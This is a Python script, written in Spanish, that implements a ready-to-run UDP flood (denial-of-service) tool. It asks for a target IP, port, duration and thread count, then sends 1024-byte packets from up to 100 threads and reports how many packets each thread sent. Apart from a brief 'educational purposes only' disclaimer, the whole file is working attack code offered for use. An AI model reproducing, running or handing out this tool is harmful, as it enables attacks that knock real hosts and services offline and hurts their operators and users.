import socket
import threading
import time
from colorama import Fore, Style
from tqdm import tqdm
import queue

def mostrar_advertencia():
    print(Fore.RED + """\n[!] ADVERTENCIA: Esta herramienta es solo para fines educativos.
    El uso indebido de esta herramienta puede ser ilegal.
    El usuario asume toda la responsabilidad por su uso.""" + Style.RESET_ALL)
    confirmacion = input(Fore.YELLOW + "\n¿Desea continuar? (s/n): " + Style.RESET_ALL).lower()
    return confirmacion == 's'

def validar_puerto(puerto):
    try:
        puerto = int(puerto)
        return 1 <= puerto <= 65535
    except ValueError:
        return False

def ddos_attack(target, port, duration, thread_id, progress_queue):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes_payload = bytes([x % 256 for x in range(1024)])  # Asegura que los valores estén en el rango 0-255
        timeout = time.time() + duration
        packets_sent = 0
        update_interval = 0.1  # Actualizar cada 0.1 segundos
        last_update = time.time()

        while time.time() < timeout:
            try:
                sock.sendto(bytes_payload, (target, port))
                packets_sent += 1
                current_time = time.time()
                if current_time - last_update >= update_interval:
                    progress = (current_time - (timeout - duration)) / duration
                    progress_queue.put((thread_id, packets_sent, progress))
                    last_update = current_time
            except socket.error as e:
                print(Fore.YELLOW + f"\n[!] Error al enviar paquete: {str(e)}" + Style.RESET_ALL)
                continue

        progress_queue.put((thread_id, packets_sent, 1.0))

    except Exception as e:
        print(Fore.RED + f"\n[!] Error en el ataque: {str(e)}" + Style.RESET_ALL)
    finally:
        if 'sock' in locals():
            sock.close()

def ejecutar_ddos():
    if not mostrar_advertencia():
        return

    try:
        target = input(Fore.GREEN + "\n>_ Ingrese la dirección IP objetivo: " + Style.RESET_ALL)
        port = input(Fore.GREEN + ">_ Ingrese el puerto (1-65535): " + Style.RESET_ALL)
        
        if not validar_puerto(port):
            print(Fore.RED + "\n[!] Puerto inválido" + Style.RESET_ALL)
            return
        
        port = int(port)
        duration = float(input(Fore.GREEN + ">_ Ingrese la duración del ataque en segundos: " + Style.RESET_ALL))
        threads = int(input(Fore.GREEN + ">_ Ingrese el número de hilos (1-100): " + Style.RESET_ALL))
        
        if not 1 <= threads <= 100:
            print(Fore.RED + "\n[!] Número de hilos inválido" + Style.RESET_ALL)
            return

        print(Fore.YELLOW + "\n[*] Iniciando ataque DDoS..." + Style.RESET_ALL)
        progress_queue = queue.Queue()
        thread_list = []
        thread_stats = {}

        for i in range(threads):
            thread = threading.Thread(target=ddos_attack, args=(target, port, duration, i, progress_queue))
            thread_list.append(thread)
            thread_stats[i] = {'packets': 0, 'progress': 0}
            thread.start()

        with tqdm(total=100, desc="Progreso del ataque", bar_format="{l_bar}{bar}| {n_fmt}%") as pbar:
            last_progress = 0
            while any(thread.is_alive() for thread in thread_list):
                try:
                    thread_id, packets, progress = progress_queue.get_nowait()
                    thread_stats[thread_id]['packets'] = packets
                    thread_stats[thread_id]['progress'] = progress
                    avg_progress = sum(stat['progress'] for stat in thread_stats.values()) / threads
                    progress_diff = int(avg_progress * 100) - last_progress
                    if progress_diff > 0:
                        pbar.update(progress_diff)
                        last_progress += progress_diff
                except queue.Empty:
                    time.sleep(0.1)

        print(Fore.GREEN + "\n[✓] Ataque completado" + Style.RESET_ALL)
        print(Fore.CYAN + "\nResumen de paquetes enviados por hilo:" + Style.RESET_ALL)
        total_packets = 0
        for thread_id, stats in thread_stats.items():
            packets = stats['packets']
            total_packets += packets
            print(f"Hilo {thread_id + 1}: {packets:,} paquetes")
        print(Fore.CYAN + f"\nTotal de paquetes enviados: {total_packets:,}" + Style.RESET_ALL)

    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[*] Ataque interrumpido por el usuario" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"\n[!] Error: {str(e)}" + Style.RESET_ALL)